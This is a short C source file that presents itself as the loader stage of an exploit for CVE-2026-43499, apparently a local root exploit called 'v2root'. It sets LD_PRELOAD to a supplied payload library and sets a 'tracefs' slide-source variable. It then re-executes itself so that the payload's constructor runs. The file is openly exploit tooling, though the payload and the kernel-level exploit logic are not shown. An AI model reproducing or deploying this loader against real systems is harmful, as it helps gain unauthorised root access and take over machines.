/*
 * Minimal v2root loader for CVE-2026-43499 exploit.
 * Usage: v2root --run-payload <payload.so> <self> <logfile>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

int main(int argc, char **argv) {
    if (argc >= 4 && strcmp(argv[1], "--run-payload") == 0) {
        const char *payload = argv[2];
        const char *self = argv[3];

        setenv("LD_PRELOAD", payload, 1);
        setenv("SLIDE_SOURCE", "tracefs", 1);

        fprintf(stderr, "[v2root] loading payload=%s\n", payload);
        execl(self, self, NULL);
        fprintf(stderr, "[v2root] execl failed: %s\n", strerror(errno));
        return 1;
    }

    /* Payload mode: LD_PRELOAD constructor runs automatically */
    fprintf(stderr, "[v2root] payload mode pid=%d\n", getpid());
    return 0;
}
